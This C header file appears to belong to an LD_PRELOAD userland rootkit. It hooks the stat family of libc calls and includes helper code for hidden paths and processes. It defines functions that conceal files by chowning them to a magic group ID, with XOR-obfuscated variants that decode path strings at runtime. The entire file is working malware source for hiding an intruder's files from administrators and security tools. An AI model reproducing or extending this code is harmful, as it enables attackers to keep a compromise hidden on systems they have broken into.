#ifndef FILES_H
#define FILES_H

#define mxstat(pathname, s) (long)call(C__XSTAT, _STAT_VER, pathname, s)
#define mxstat64(pathname, s) (long)call(C__XSTAT64, _STAT_VER, pathname, s)
#define mfxstat(fd, s) (long)call(C__FXSTAT, _STAT_VER, fd, s)
#define mfxstat64(fd, s) (long)call(C__FXSTAT64, _STAT_VER, fd, s)
#define mlxstat(pathname, s) (long)call(C__LXSTAT, _STAT_VER, pathname, s)
#define mlxstat64(pathname, s) (long)call(C__LXSTAT64, _STAT_VER, pathname, s)
gid_t get_path_gid(const char *pathname);
gid_t get_path_gid64(const char *pathname);
gid_t lget_path_gid(const char *pathname);
gid_t lget_path_gid64(const char *pathname);
gid_t get_fd_gid(int fd);
gid_t get_fd_gid64(int fd);
#include "get_path_gid.c"

int _hidden_path(const char *pathname, int mode);
int _f_hidden_path(int fd, int mode);
int _l_hidden_path(const char *pathname, int mode);
int hidden_proc(pid_t pid);
#include "hidden.c"

#define hidden_path(path) _hidden_path(path, MODE_REG)
#define hidden_path64(path) _hidden_path(path, MODE_64)
#define hidden_fd(fd) _f_hidden_path(fd, MODE_REG)
#define hidden_fd64(fd) _f_hidden_path(fd, MODE_64)
#define hidden_lpath(path) _l_hidden_path(path, MODE_REG)
#define hidden_lpath64(path) _l_hidden_path(path, MODE_64)

int chown_path(char *path, gid_t gid){
    hook(CCHOWN);
    return (long)call(CCHOWN, path, 0, gid);
}

int hide_path(char *path){
#ifndef HIDE_SELF
    return 0;
#endif

    if(not_user(0)) return -1;
    if(hidden_path(path)) return 1;
    return chown_path(path, MAGIC_GID);
}

int unhide_path(char *path){
#ifndef HIDE_SELF
    return 0;
#endif

    if(not_user(0)) return -1;
    if(!hidden_path(path)) return 1;
    return chown_path(path, 0);
}

int xhide_path(const char *path){
#ifndef HIDE_SELF
    return 0;
#endif

    int ret;
    xor(_path, path);
    ret = hide_path(_path);
    clean(_path);
    return ret;
}

int xunhide_path(const char *path){
#ifndef HIDE_SELF
    return 0;
#endif

    int ret;
    xor(_path, path);
    ret = unhide_path(_path);
    clean(_path);
    return ret;
}

#endif